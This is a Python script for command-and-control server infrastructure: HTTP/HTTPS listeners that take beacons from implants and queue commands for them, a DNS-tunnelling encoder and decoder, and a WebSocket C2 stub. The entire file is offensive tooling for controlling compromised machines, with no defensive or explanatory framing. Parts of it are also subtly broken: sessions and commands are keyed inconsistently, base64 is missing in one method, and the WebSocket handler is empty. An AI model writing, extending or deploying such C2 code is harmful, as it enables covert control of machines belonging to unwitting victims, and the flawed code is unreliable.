#!/usr/bin/env python3
import socket
import ssl
import threading
import struct
import json
from datetime import datetime

class C2Server:
    def __init__(self, host="0.0.0.0", port=8443):
        self.host = host
        self.port = port
        self.clients = {}
        self.commands = {}
        
    def start_http(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        
        print(f"C2 server listening on {self.host}:{self.port}")
        
        while True:
            client, addr = server.accept()
            threading.Thread(target=self.handle_client, args=(client, addr)).start()
            
    def start_https(self, cert_file="server.pem", key_file="server.key"):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(cert_file, key_file)
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        
        print(f"C2 HTTPS server listening on {self.host}:{self.port}")
        
        while True:
            client, addr = server.accept()
            ssl_client = context.wrap_socket(client, server_side=True)
            threading.Thread(target=self.handle_client, args=(ssl_client, addr)).start()
            
    def handle_client(self, client, addr):
        session_id = f"{addr[0]}:{addr[1]}"
        print(f"New connection from {session_id}")
        
        # receive beacon
        data = client.recv(4096)
        if b"SESSION=" in data:
            session = data.split(b"SESSION=")[1].split(b"\r\n")[0]
            self.clients[session.decode()] = {
                "ip": addr[0],
                "last_seen": datetime.now().isoformat(),
                "data": data
            }
            
        # send commands
        commands = self.get_commands(session_id)
        response = json.dumps(commands).encode()
        
        client.send(response)
        client.close()
        
    def get_commands(self, session_id):
        if session_id in self.commands:
            return self.commands[session_id]
        return {"cmd": "sleep", "args": ["60"]}
        
    def add_command(self, session_id, cmd, args):
        if session_id not in self.commands:
            self.commands[session_id] = []
        self.commands[session_id].append({"cmd": cmd, "args": args})

class DNSC2:
    def __init__(self, domain="tunnel.com"):
        self.domain = domain
        self.queries = {}
        
    def decode_query(self, query):
        # extract data from DNS query
        parts = query.split(".")
        encoded = parts[0]
        import base64
        data = base64.b32decode(encoded.upper() + "====")
        return data
        
    def encode_response(self, data):
        encoded = base64.b32encode(data).decode().rstrip("=")
        return f"{encoded}.response.{self.domain}"

class WebSocketC2:
    def __init__(self, host="0.0.0.0", port=8080):
        self.host = host
        self.port = port
        
    def start(self):
        import websockets
        import asyncio
        
        async def handle_client(websocket, path):
            async for message in websocket:
                # process message
                await websocket.send(json.dumps({"status": "received"}))
                
        start_server = websockets.serve(handle_client, self.host, self.port)
        asyncio.get_event_loop().run_until_complete(start_server)
        asyncio.get_event_loop().run_forever()
